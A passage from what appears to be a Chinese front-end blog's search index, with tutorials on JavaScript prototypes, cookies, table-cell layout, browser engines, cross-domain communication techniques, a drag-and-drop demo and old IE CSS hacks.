//true其实Javascript还提供了一个instanceof运算符，验证原型对象与实例对象之间的关系。12alert(Dog1 instanceof Dog); //truealert(Dog2 instanceof Dog); //true4.构造函数模式的问题构造函数方法很好用，但是存在一个浪费内存的问题。请看，我们现在为Dog对象添加一个不变的属性”type”（种类），再添加一个方法eat（吃老鼠）。那么，原型对象Dog就变成了下面这样：123456function Dog(name,color)&#123; this.name = name; this.color = color; this.type = "四条腿的动物"; this.eat = function()&#123;alert("狗喜欢欺负猫");&#125;;&#125;还是采用同样的方法，生成实例：1234var Dog1 = new Dog("大黄","黄色");var Dog2 = new Dog ("二黄","黑色");alert(Dog1.type); // 四条腿的动物Dog1.eat(); // 狗喜欢欺负猫表面上好像没什么问题，但是实际上这样做，有一个很大的弊端。那就是对于每一个实例对象，type属性和eat()方法都是一模一样的内容，每一次生成一个实例，都必须为重复的内容，多占用一些内存。这样既不环保，也缺乏效率。1alert(cat1.eat == cat2.eat); //false那有没有能让type属性和eat()方法在内存中只生成一次，然后所有实例都指向那个内存地址呢？当然可以：5.Prototype模式Javascript规定，每一个构造函数都有一个prototype属性，指向另一个对象。这个对象的所有属性和方法，都会被构造函数的实例继承。这意味着，我们可以把那些不变的属性和方法，直接定义在prototype对象上。123456function Dog(name,color)&#123; this.name = name; this.color = color;&#125;Dog.prototype.type = "四条腿的动物";Dog.prototype.eat = function()&#123;alert("狗喜欢欺负猫")&#125;;然后，生成实例。1234var Dog1 = new Dog("大黄","黄色");var Dog2 = new Dog ("二黄","黑色");alert(Dog1.type); // 四条腿的动物Dog1.eat(); // 狗喜欢欺负猫这时所有实例的type属性和eat()方法，其实都是同一个内存地址，指向prototype对象，因此就提高了运行效率。1alert(Dog1.eat == Dog2.eat); //true6.Prototype模式的验证方法为了配合prototype属性，Javascript定义了一些辅助方法，帮助我们使用它。isPrototypeOf()这个方法用来判断，某个proptotype对象和某个实例之间的关系。12alert(Dog.prototype.isPrototypeOf(Dog1)); //truealert(Dog.prototype.isPrototypeOf(Dog2)); //truehasOwnProperty()每个实例对象都有一个hasOwnProperty()方法，用来判断某一个属性到底是本地属性，还是继承自prototype对象的属性。12alert(Dog1.hasOwnProperty("name")); // truealert(Dog1.hasOwnProperty("type")); // falsein运算符in运算符可以用来判断，某个实例是否含有某个属性，不管是不是本地属性。12alert("name" in Dog1); // truealert("type" in Dog1); // truein运算符还可以用来遍历某个对象的所有属性。1for(var prop in Dog1) &#123; alert("Dog1["+prop+"]="+Dog1[prop]); &#125;以上只是我的浅解，希望对大家学习JS面向对象编程有所帮助！]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js封装方法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[布局神器display:table-cell]]></title>
    <url>%2F2015%2F07%2F17%2F%E5%B8%83%E5%B1%80%E7%A5%9E%E5%99%A8displaytable-cell%2F</url>
    <content type="text"><![CDATA[背景&emsp;&emsp;随着时间的推进，ie6、ie7在中国浏览器市场的占有率越来越低的情况，我现在工作的团队，经过用户访问数据，得知ie6、ie7的用户已经非常少的前提下，决定不在兼容ie6、ie7。正式在这个激动人心的决定后，让我对display:table-cell；这个属性有了更加深入的应用和理解。在ie8还必须兼容的pc端，它绝对是一个现代的布局神器。&emsp;&emsp;我并不喜欢用float来做布局，因为它触发的问题比较多，例如要清除浮动，元素浮动后还会导致该元素脱离文档流，即使你清除float，该元素依旧是脱离文档流。&emsp;&emsp;在需要兼容ie6、ie7的时代我也尽量避免使用float来布局，左右布局能用display:inline-block;布局我就用它来布局，但是还是无法完全不使用它，很多布局例如需要靠左和靠右的布局场景下就没办法不去使用float来布局。我现在切页面很少会去在ie下查看效果，大部分是通过chrome来进行调试的，等整个页面切好了，再用ie过一遍页面，大部分时候页面是没什么太多兼容问题，这或许多年来工作累积的经验使我写代码时避开了一些兼容坑，也可能是自己对盒模型摸索许久以来的一些经验。&emsp;&emsp;废话不多说，下面直接看demo例子，好可以快速爱上display:inline-block;元素两端对齐&emsp;&emsp;第一个案例是让两个元素分别向左和向右对齐，如果是过去，我一定会用float来实现，但其实用table可以这么做：DEMO1自动平均划分每个小模块，使其一行显示第二个案例我们先看看图：&emsp;&emsp;遇到上面这种布局，一般会用float来做，或者把每个li设置成display:inline-block;来做，并且都要设置给他们设置一个宽度，而且最痛苦的是5个li如果你设置width:20%;他们一定会掉下来，如果li都设置成display:table-cell；就不会出现这种情况，即使不设置宽度他们也会在一行显示，你在加多一行他也不会掉下来，依旧会在一样显示。DEMO2图片垂直居中于元素&emsp;&emsp;有时候我们需要让图片垂直水平都居中于某个元素，用常规写法比较复杂，但用table-cell则相对简单：DEMO3两box实现等高对齐&emsp;&emsp;上图中的左侧的box的高度始终跟随右侧的box的高度变化而变化：DEMO4&emsp;&emsp;上面的案例我故意不对右侧的box设置display:table-cell，只对左侧，所以就会出现左侧跟随右侧高度变化而变化，如果要实现不管两个box哪个高度产生变化另一个就跟随，只需要把右侧的box也设置成display:table－cell就可以实现了。弹性、响应式布局&emsp;&emsp;上面的demo中大家只要改变浏览器宽度就会发现他们其实都是会随高度变化自动变化高度的，其实上面内容我大部分没有设置绝对单位，即使设置了也只设置其中一个box另一个就让他去自适应父元素的剩余留下来的宽度，其实布局的时候设置宽度是一件很痛苦的事情，因为除了大量计算有时候可能在多浏览器下还算不准，可能你在chrome设好的宽度在ie下就坑爹了，要写hack才能解决。最后一个案例，据不靠谱的传言faceboox曾经也这么使用过：DEMO5&emsp;&emsp;移动端布局因为有display:box这等属性，所以table-cell相对就排不上什么大用场，不过在移动端你要用table-cell也不是不可以，根据自己对属性的理解去使用就可以了。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>display:table-cell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS:cookie(创建，读取，删除)]]></title>
    <url>%2F2015%2F07%2F17%2Fjscookie%E5%88%9B%E5%BB%BA%EF%BC%8C%E8%AF%BB%E5%8F%96%EF%BC%8C%E5%88%A0%E9%99%A4%2F</url>
    <content type="text"><![CDATA[一、创建cookie12345678910111213141516function setCookie(name, value, expires, path, domain, secure) &#123;var cookieText = encodeURIComponent(name) + '=' + encodeURIComponent(value);if (expires instanceof Date) &#123;cookieText += '; expires=' + expires;&#125;if (path) &#123;cookieText += '; path=' + path;&#125;if (domain) &#123;cookieText += '; domain=' + domain;&#125;if (secure) &#123;cookieText += '; secure='+secure;&#125;document.cookie = cookieText;&#125;&nbsp;二、获取cookie123456789101112131415function getCookie(name) &#123;var cookieName = encodeURIComponent(name) + '=';var cookieStart = document.cookie.indexOf(cookieName);var cookieValue = null;if (cookieStart &gt; -1) &#123;var cookieEnd = document.cookie.indexOf(';', cookieStart);if (cookieEnd == -1) &#123;cookieEnd = document.cookie.length;&#125;cookieValue = decodeURIComponent(document.cookie.substring(cookieStart + cookieName.length, cookieEnd));&#125;return cookieValue;&#125;&nbsp;三、删除cookie123function unsetCookie(name) &#123;document.cookie = name + "= ; expires=" + new Date(0);&#125;&nbsp;四、失效天数，直接传一个天数即可123456789function setCookieDate(day) &#123;if (typeof day == 'number' &amp;amp;&amp;amp; day &gt; 0) &#123;var date = new Date();date.setDate(date.getDate() + day);&#125; else &#123;throw new Error('传递的day必须是一个天数，必须比0大');&#125;return date;&#125;&nbsp;五、HTML5中提供了localStorage方法12345678910//通过方法存储和获取localStorage.setItem('name', '李炎恢');alert(localStorage.getItem('name'));//通过属性存储和获取localStorage.book = '李炎恢';alert(localStorage.book);//删除存储localStorage.removeItem('name');&nbsp;PS：是永久保存的，保存在缓存里，只有手工删除或者清理浏览器缓存方可失效。在容量上也有一些限制，主要看浏览器的差异，Firefox3+、IE8+、Opera为5M，，Chrome和Safari为2.5M。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js cookie</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十六进制颜色转换成RGB]]></title>
    <url>%2F2015%2F07%2F17%2F%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E8%BD%AC%E6%8D%A2%E6%88%90rgb%2F</url>
    <content type="text"><![CDATA[使用示例：“#333”.toRGB();“#AAAAAA”.toRGB();1234567891011121314151617181920String.prototype.toRGB = function()&#123; var _color = this, _rgb = []; if(_color.search(/^#[a-fA-F0-9]&#123;3&#125;$|^#[a-fA-F0-9]&#123;6&#125;$/) === 0)&#123; // 如果是3位的十六进制转换成6位的十六进制 if(this.length === 4)&#123; _color = this.replace(/[a-fA-F0-9]/g, function(color)&#123; return color + color; &#125;) &#125; // 将十六进制颜色转换成RGB模式 _color.replace(/[a-fA-F0-9]&#123;2&#125;/g, function(color)&#123; _rgb.push(parseInt(color, 16)); &#125;); return "rgb("+ _rgb.toString() + ")"; &#125; console.error("类型错误"); return null;&#125;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>换成RGB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浏览器内核分类]]></title>
    <url>%2F2015%2F07%2F17%2F%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8%E5%88%86%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;现在市面上五花八门的浏览器一大堆，包括移动端的。作为前端开发者，要处理好兼容各个浏览器也是比较头疼的事。我根据个人的了解和查找资料，整理一下目前主流的浏览器内核。1.Trident内核&emsp;&emsp;Trident内核也就是我们常说的IE内核，最具代表性的当然就是IE浏览器了。Trident(又称为MSHTML)，是微软开发的一种排版引擎。它在1997年10月与IE4一起诞生，一直在被不断地更新和完善。&emsp;&emsp;目前使用Trident渲染引擎的浏览器包括：IE、傲游、世界之窗浏览器以及360浏览器、搜狗浏览器都带有ie内核等。对于ie浏览器，低版本的ie浏览器对css3的新属性不能很好的支持，ie9+才可以支持个别的属性，一些能支持的属性也要加个前缀-ms-。&emsp;&emsp;windowsphone手机自带的ie浏览器也是ie10+的，因此在开发移动端中需要兼容wp手机的就要注意哪些新属性在ie10+中不支持的要尽量的避免使用。wp手机中的浏览器都会优先调用ie内核，像uc浏览器调用的ie内核就是在ie8以下的，兼容性极差。2.WebKit内核&emsp;&emsp;webkit内核可以说是目前非常主流的内核了，主要代表产品有Safari和Google的浏览器Chrome。在移动端几乎是webkit的天下了，Google的Android平台浏览器、Apple的iPhone浏览器、Nokia S60浏览器等所使用的浏览器内核引擎，都是基于WebKit引擎的。我们最熟悉的微信内置的浏览器的内核也是基于webkit深度优化的增强内核，搭载在手机qq浏览器上。对于移动端的开发大部分的需求都需要兼容微信浏览器，对于css3的属性加个前缀-webkit-即可。3.Gecko内核&emsp;&emsp;Gecko内核最具代表性的就是火狐浏览器了。Gecko是由Mozilla基金会开发的布局引擎的名字。它原本叫作NGLayout。Gecko的作用是读取诸如HTML、CSS、XUL和JavaScript等的网页内容，并呈现到用户屏幕或打印出来。Gecko已经被许多应用程序所使用，包括若干浏览器，例如Firefox、Mozilla Suite、Camino等等。市面上Gecko内核的浏览器主要分两类，一类是以Mozilla Firefox为代表的，用XUL作为界面描述语言的浏览器：这类浏览器往往继承了Firefox扩展性好的优点，早前的Madfox和Albatross就是这一类型的浏览器。所以，Gecko内核也被称为Firefox内核。另一类是使用本地图形库作为界面的Gecko内核的浏览器：其中有Linux平台上epiphany、Galeon等；在win32上由Orca Browser、K-Meleon等。在兼容css3属性前面需要加前缀-moz-。4.Presto内核&emsp;&emsp;Presto内核最具代表性的就是opera浏览器了。Presto是由Opera Software开发的浏览器排版引擎，供Opera 7.0及以上使用。它取代了旧版Opera 4至6版本使用的Elektra排版引擎，包括加入动态功能，例如网页或其部分可随着DOM及Script语法的事件而重新排版。Presto的特点就是渲染速度的优化达到了极致，它是目前公认的网页浏览速度最快的浏览器内核，然而代价是牺牲了网页的兼容性。在兼容css3属性前面需要加前缀-o-。&emsp;&emsp;下次整理一下内核不兼容的一下常用属性，避免开发过程中使用后兼容性不高。若有说错的地方还请指正！]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>内核分类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文本框禁止复制粘贴操作]]></title>
    <url>%2F2015%2F07%2F17%2F%E6%96%87%E6%9C%AC%E6%A1%86%E7%A6%81%E6%AD%A2%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;利用剪切板的copy、cut、paste事件操作。&emsp;&emsp;兼容性上：上述三种事件，只要在上下文菜单（右键菜单）,或者使用了相应的键盘组合键，所有浏览器上都可以触发它们。&emsp;&emsp;核心语句即为：当用户触发此三种事件时，通过JS阻止事件的默认行为。123EventUtil.addHandler(text,'copy',function(event)&#123;//copy换成paste、cutevent = EventUtil.getEvent(event);//取eventEventUtil.preventDefault(event);//阻止其默认行为&emsp;&emsp;这里用EventUtil对象封装了一些跨浏览器的操作事件的方法。addHandler为跨浏览器事件处理方法。贴一下EventUtil.js12345678910111213141516171819202122var EventUtil = &#123;addHandler: function(element, type, handler)&#123;if (element.addEventListener)&#123;element.addEventListener(type, handler, false);&#125; else if (element.attachEvent)&#123;element.attachEvent("on" + type, handler);&#125; else &#123;element["on" + type] = handler;&#125;&#125;,getEvent: function(event)&#123;return event ? event : window.event;&#125;,preventDefault: function(event)&#123;if (event.preventDefault)&#123;event.preventDefault();&#125; else &#123;event.returnValue = false;&#125;&#125;,&emsp;&emsp;另外试着用键盘事件来阻止复制粘贴行为，发现chrome中只有keydown事件才能获取到ctrl的keycode值：=17（keypress和keyup为0或无反应）；&emsp;&emsp;用preventDefault(event)不能阻止复制/粘贴行为，可能因为该事件的默认事件为键盘输入，不过通过alert(“xxx”)弹出消息可以抵消掉后续的行为，等于变相的阻止复制粘贴行为。1234567EventUtil.addHandler(text,'keydown',function(event)&#123;event = EventUtil.getEvent(event);if(event.keyCode===17)&#123;EventUtil.preventDefault(event);//该行代码无效alert('操作错误');&#125;&#125;);Demo演示]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>文本框禁止复制粘贴</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js跨域总结及解决方案]]></title>
    <url>%2F2015%2F07%2F17%2Fjs%E8%B7%A8%E5%9F%9F%E6%80%BB%E7%BB%93%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[什么是跨域JavaScript出于安全方面的考虑，不允许跨域调用其他页面的对象。但在安全限制的同时也给注入iframe或是ajax应用上带来了不少麻烦。这里把涉及到跨域的一些问题简单地整理一下：首先什么是跨域，简单地理解就是因为JavaScript同源策略的限制，a.com 域名下的js无法操作b.com或是c.a.com域名下的对象。更详细的说明可以看下图：特别注意两点：第一：如果是协议和端口造成的跨域问题“前台”是无能为力的，第二：在跨域问题上，域仅仅是通过“URL的首部”来识别而不会去尝试判断相同的ip地址对应着两个域或两个域是否在同一个ip上。“URL的首部”指window.location.protocol +window.location.host，也可以理解为“Domains, protocols and ports must match”。接下来简单地总结一下在“前台”一般处理跨域的办法，后台proxy这种方案牵涉到后台配置，这里就不阐述了。1、document.domain+iframe的设置对于主域相同而子域不同的例子，可以通过设置document.domain的办法来解决。具体的做法是可以在http://www.a.com/a.html和http://script.a.com/b.html两个文件中**分别加上**document.domain = ‘a.com’；然后通过a.html文件中创建一个iframe，去控制iframe的contentDocument，这样两个js文件之间就可以“交互”了。当然这种办法只能解决主域相同而二级域名不同的情况，如果你异想天开的把script.a.com的domian设为alibaba.com那显然是会报错地！代码如下：www.a.com上的a.html12345678910document.domain = 'a.com';var ifr = document.createElement('iframe');ifr.src = 'http://script.a.com/b.html';ifr.style.display = 'none';document.body.appendChild(ifr);ifr.onload = function()&#123;var doc = ifr.contentDocument || ifr.contentWindow.document;// 在这里操纵b.htmlalert(doc.getElementsByTagName("h1")[0].childNodes[0].nodeValue);&#125;;script.a.com上的b.html1document.domain = 'a.com';这种方式适用于{www.kuqin.com, kuqin.com, script.kuqin.com, css.kuqin.com}中的任何页面相互通信。备注：某一页面的domain默认等于window.location.hostname。主域名是不带www的域名，例如a.com，主域名前面带前缀的通常都为二级域名或多级域名，例如www.a.com其实是二级域名。 domain只能设置为主域名，不可以在b.a.com中将domain设置为c.a.com。问题：1、安全性，当一个站点（b.a.com）被攻击后，另一个站点（c.a.com）会引起安全漏洞。2、如果一个页面中引入多个iframe，要想能够操作所有iframe，必须都得设置相同domain。2、动态创建script虽然浏览器默认禁止了跨域访问，但并不禁止在页面中引用其他域的JS文件，并可以自由执行引入的JS文件中的function（包括操作cookie、Dom等等）。根据这一点，可以方便地通过创建script节点的方法来实现完全跨域的通信。这里判断script节点加载完毕还是蛮有意思的：ie只能通过script的readystatechange属性，其它浏览器是script的load事件。以下是部分判断script加载完毕的方法。123456js.onload = js.onreadystatechange = function() &#123;if (!this.readyState || this.readyState === 'loaded' || this.readyState === 'complete') &#123;// callback在此处执行js.onload = js.onreadystatechange = null;&#125;&#125;;3、利用iframe和location.hash这个办法比较绕，但是可以解决完全跨域情况下的脚步置换问题。原理是利用location.hash来进行传值。在url： http://a.com#helloword中的‘#helloworld’就是location.hash，**改变hash并不会导致页面刷新**，所以可以利用hash值来进行数据传递，当然数据容量是有限的。假设域名a.com下的文件cs1.html要和cnblogs.com域名下的cs2.html传递信息，cs1.html首先创建自动创建一个隐藏的iframe，iframe的src指向cnblogs.com域名下的cs2.html页面，这时的hash值可以做参数传递用。cs2.html响应请求后再将通过修改cs1.html的hash值来传递数据（由于两个页面不在同一个域下IE、Chrome不允许修改parent.location.hash的值，所以要借助于a.com域名下的一个代理iframe；Firefox可以修改）。同时在cs1.html上加一个**定时器**，隔一段时间来判断location.hash的值有没有变化，一点有变化则获取获取hash值。代码如下：先是a.com下的文件cs1.html文件：12345678910111213141516function startRequest()&#123;var ifr = document.createElement('iframe');ifr.style.display = 'none';ifr.src = 'http://www.cnblogs.com/lab/cscript/cs2.html#paramdo';document.body.appendChild(ifr);&#125;function checkHash() &#123;try &#123;var data = location.hash ? location.hash.substring(1) : '';if (console.log) &#123;console.log('Now the data is '+data);&#125;&#125; catch(e) &#123;&#125;;&#125;setInterval(checkHash, 2000);cnblogs.com域名下的cs2.html：12345678910111213141516171819202122//模拟一个简单的参数处理操作switch(location.hash)&#123;case '#paramdo':callBack();break;case '#paramset'://do something……break;&#125;function callBack()&#123;try &#123;parent.location.hash = 'somedata';&#125; catch (e) &#123;// ie、chrome的安全机制无法修改parent.location.hash，// 所以要利用一个中间的cnblogs域下的代理iframevar ifrproxy = document.createElement('iframe');ifrproxy.style.display = 'none';ifrproxy.src = 'http://a.com/test/cscript/cs3.html#somedata'; // 注意该文件在"a.com"域下document.body.appendChild(ifrproxy);&#125;&#125;a.com下的域名cs3.html：12//因为parent.parent和自身属于同一个域，所以可以改变其location.hash的值parent.parent.location.hash = self.location.hash.substring(1);当然这样做也存在很多缺点，诸如数据直接暴露在了url中，数据容量和类型都有限等……4、window.name实现的跨域数据传输有三个页面：a.com/app.html：应用页面。a.com/proxy.html：代理文件，一般是一个没有任何内容的html文件，需要和应用页面在同一域下。b.com/data.html：应用页面需要获取数据的页面，可称为数据页面。实现起来基本步骤如下：1）在应用页面（a.com/app.html）中创建一个iframe，把其src指向数据页面（b.com/data.html）。数据页面会把数据附加到这个iframe的window.name上，data.html代码如下：1234&lt;script type="text/javascript"&gt;window.name = 'I was there!'; // 这里是要传输的数据，大小一般为2M，IE和firefox下可以大至32M左右// 数据格式可以自定义，如json、字符串&lt;/script&gt;2）在应用页面（a.com/app.html）中监听iframe的onload事件，在此事件中设置这个iframe的src指向本地域的代理文件（代理文件和应用页面在同一域下，所以可以相互通信）。app.html部分代码如下：1234567891011121314151617181920&lt;script type="text/javascript"&gt;var state = 0,iframe = document.createElement('iframe'),loadfn = function() &#123;if (state === 1) &#123;var data = iframe.contentWindow.name; // 读取数据alert(data); //弹出'I was there!'&#125; else if (state === 0) &#123;state = 1;iframe.contentWindow.location = "http://a.com/proxy.html"; // 设置的代理文件&#125;&#125;;iframe.src = 'http://b.com/data.html';if (iframe.attachEvent) &#123;iframe.attachEvent('onload', loadfn);&#125; else &#123;iframe.onload = loadfn;&#125;document.body.appendChild(iframe);&lt;/script&gt;3）获取数据以后销毁这个iframe，释放内存；这也保证了安全（不被其他域frame js访问）。12345&lt;script type="text/javascript"&gt;iframe.contentWindow.document.write('');iframe.contentWindow.close();document.body.removeChild(iframe);&lt;/script&gt;总结起来即：iframe的src属性由外域转向本地域，跨域数据即由iframe的window.name从外域传递到本地域。这个就巧妙地绕过了浏览器的跨域访问限制，但同时它又是安全操作。5、使用HTML5 postMessageHTML5中最酷的新功能之一就是跨文档消息传输Cross Document Messaging。下一代浏览器都将支持这个功能：Chrome 2.0+、Internet Explorer 8.0+, Firefox 3.0+, Opera 9.6+, 和 Safari 4.0+ 。 Facebook已经使用了这个功能，用postMessage支持基于web的实时消息传递。otherWindow.postMessage(message, targetOrigin);otherWindow: 对接收信息页面的window的引用。可以是页面中iframe的contentWindow属性；window.open的返回值；通过name或下标从window.frames取到的值。message: 所要发送的数据，string类型。targetOrigin: 用于限制otherWindow，“*”表示不作限制a.com/index.html中的代码：123456789&lt;iframe id="ifr" src="b.com/index.html"&gt;&lt;/iframe&gt;&lt;script type="text/javascript"&gt;window.onload = function() &#123;var ifr = document.getElementById('ifr');var targetOrigin = 'http://b.com'; // 若写成'http://b.com/c/proxy.html'效果一样// 若写成'http://c.com'就不会执行postMessage了ifr.contentWindow.postMessage('I was there!', targetOrigin);&#125;;&lt;/script&gt;b.com/index.html中的代码：12345678910&lt;script type="text/javascript"&gt;window.addEventListener('message', function(event)&#123;// 通过origin属性判断消息来源地址if (event.origin == 'http://a.com') &#123;alert(event.data); // 弹出"I was there!"alert(event.source); // 对a.com、index.html中window对象的引用// 但由于同源策略，这里event.source不可以访问window对象&#125;&#125;, false);&lt;/script&gt;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js跨域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面向对象---拖拽]]></title>
    <url>%2F2015%2F07%2F17%2F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E6%8B%96%E6%8B%BD%2F</url>
    <content type="text"><![CDATA[一、非面向对象的写法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;title&gt;无标题文档&lt;/title&gt;&lt;script type="text/javascript"&gt;window.onload=function()&#123;var oDiv=document.getElementById('div1');oDiv.onmousedown=function(ev)&#123;var oEvent=ev||event;var x=0;var y=0;x=oEvent.clientX-oDiv.offsetLeft;y=oEvent.clientY-oDiv.offsetTop;document.onmousemove=function(ev)&#123;var oEvent=ev||event;var out1=oEvent.clientX-x;var out2=oEvent.clientY-y;var oWidth=document.documentElement.clientWidth-oDiv.offsetWidth;var oHeight=document.documentElement.clientHeight-oDiv.offsetHeight;if(out1&lt;0)&#123;out1=0;&#125;else if (out1&gt;oWidth)&#123;out1=oWidth;&#125;if(out2&lt;0)&#123;out2=0;&#125;else if (out2&gt;oHeight)&#123;out2=oHeight;&#125;oDiv.style.left=out1+'px';oDiv.style.top=out2+'px';&#125;document.onmouseup=function()&#123;document.onmousemove=null;document.onmouseup=null;&#125;return false;//解决firefox低版本的bug问题&#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="div1" style="width:100px; height:100px; background:#060; border:1px solid #039; position:absolute;"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&nbsp;二、面向对象的写法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset='utf-8'&gt;&lt;title&gt;&lt;/title&gt;&lt;style type="text/css"&gt;*&#123; margin:0; padding:0;&#125;.drag&#123; width:100px; height: 100px; background:red; position: absolute;&#125;&lt;/style&gt;&lt;script type="text/javascript" src='jquery-1.11.1.min.js'&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;window.onload=function()&#123;var dg=new Drag('drag');&#125;;function Drag(obj)&#123;this.oDiv=document.getElementById(obj);this.x=0;this.y=0;var _this=this;this.oDiv.onmousedown=function(ev)&#123;_this.cc(ev);return false;&#125;;&#125;;Drag.prototype.cc=function(ev)&#123;var oEvent=ev||event;var _this=this;this.x=oEvent.clientX-this.oDiv.offsetLeft;this.y=oEvent.clientY-this.oDiv.offsetTop;document.onmousemove=function(ev)&#123;_this.aa(ev);&#125;;document.onmouseup=function()&#123;_this.bb();&#125;;&#125;;Drag.prototype.aa=function(ev)&#123;var oEvent=ev||event;var outX=oEvent.clientX-this.x;var outY=oEvent.clientY-this.y;if (outX&lt;=0) &#123;outX=0;&#125;else if(outX&gt;document.documentElement.clientWidth-this.oDiv.offsetWidth)&#123;outX=document.documentElement.clientWidth-this.oDiv.offsetWidth;&#125;;if (outY&lt;=0) &#123;outY=0;&#125;else if(outY&gt;document.documentElement.clientHeight-this.oDiv.offsetHeight)&#123;outY=document.documentElement.clientHeight-this.oDiv.offsetHeight;&#125;;this.oDiv.style.left=outX+'px';this.oDiv.style.top=outY+'px';&#125;;Drag.prototype.bb=function(ev)&#123;document.onmousemove=null;document.onmouseout=null;&#125;;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="drag" id='drag'&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js拖拽</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见浏览器的兼容问题]]></title>
    <url>%2F2015%2F07%2F17%2F%E5%B8%B8%E8%A7%81%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%85%BC%E5%AE%B9%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[1、ie6.0横向margin加倍产生因素：块属性、float、有横向margin。解决方法：display：inline；2、ie6.0下默认有行高解决方法：overflow:hidden;或font-size:0;或line-height：xx px；3、在各个浏览器下img有空隙(原因是：回车。)解决方法:让图片浮动。4、一个父标签与几个子标签嵌套，父标签不浮动，子标签float，子标签不撑开父的高度。解决方法：a 在子标签最后清浮动{&amp;nbsp;}b 父标签添加{overflow：hidden；}c 给父标签设置高度5、Ie6下，不识别最大宽、高度和最小宽高度，意即min-width/height和 Max-width/height在ie6中没效果解决方法：12(1)：.abc&#123;border:1px blue solid;width:200px;height:200px;&#125;html&gt;body .abc&#123;width:auto;height:auto;min-width:200px;min-height:200px;&#125;1(2)：.abc&#123;width:200px;height:200px;_width:200px;_height:200px;&#125;（因为ie6有一个特征，当定义一个高度时，如果内容超过高度，元素会自动调整高度。）6、Ie6里面：如li设宽、高，并且li里面的标签浮动，那么li之间会有间距解决方法：li不设宽、高或者li内的标签不浮动7、li之间有间距解决方法：li 设置vertical-align:middle;8、3像素问题：ie6下，当浮动元素与流动元素并列显示时，他们之间会存在三像素问题。解决方法：用hack技术，例如：所有浏览器通用 height:100px;ie6专用_height:100px;ie7专用*+height:100px;ie6/ie7共用*height:100px;9、当定义行内元素为包含框时，且包含框包含的绝对定位元素以百分比为单位进行定位时，会出现混乱。解决方法：在行内元素里加入{zoom：1；}10、当多个浮动元素中间夹杂着HTML注释语句时，如果浮动元素宽度为100%，则在下一行多显示一个上一行最后一个字符。解决办法：给浮动元素添加display:inline;。11、opacity 定义元素的不透明度filter：alpha（opacity=80）；/ie支持该属性/opacity：0.8；/支持css3的浏览器/12、两个块元素，竖向的margin值不增加，会重叠，其间距为最大margin值。13、优先级：被!important 注明的css属性具有最高优先级(.abc{color:red !important;})。但在ie6中!important具有一个bug:在同一组css属性中，!important不起作用。14、火狐不识别background-position-y 或background-position-x;15、ie6 不支持 fixed16、解决 ie6 最大、最小宽高 hack方法1234567891011121314151617181920212223/* 最小宽度 */.min_width&#123;min-width:300px;_width:expression(parseInt(this.clientWidth) &lt; 300 ? "300px" : this.clientWidth);&#125;/* 最大宽度 */.max_width&#123;max-width:600px;_width:expression(parseInt(this.clientWidth) &gt; 600 ? "600px" : this.clientWidth);&#125;/* 最小高度 */.min_height&#123;min-height:200px;_height:expression(parseInt(this.clientHeight) &lt; 200 ? "200px" : this.clientHeight);&#125;/* 最大高度 */.max_height&#123;max-height:400px;_height:expression(parseInt(this.clientHeight) &gt; 400 ? "400px" : this.clientHeight);&#125;17、z-index不起作用的 bug1）ie6下 首先讲讲第一种z-index无论设置多高都不起作用情况。这种情况发生的条件有三个：1、父标签position属性为relative；2、问题标签含有浮动(float)属性。2）所有浏览器：它只认第一个爸爸层级的高低不仅要看自己，还要看自己的老爸这个后台是否够硬。用术语具体描述为：父标签position属性为relative或absolute时，子标签的absolute属性是相对于父标签而言的。而在IE6下，层级的表现有时候不是看子标签的z-index多高，而要看它们的父标签的z-index谁高谁低。18、ie各个版本hack1234567891011/*类内部hack：*/.header &#123;_width:100px;&#125; /* IE6专用*/.header &#123;*+width:100px;&#125; /* IE7专用*/.header &#123;*width:100px;&#125; /* IE6、IE7共用*/.header &#123;width:100px\0;&#125; /* IE8、IE9共用*/.header &#123;width:100px\9;&#125; /* IE6、IE7、IE8、IE9共用*/.header &#123;width:330px\9\0;&#125; /* IE9专用*//*选择器Hack：*/*html .header&#123;&#125; 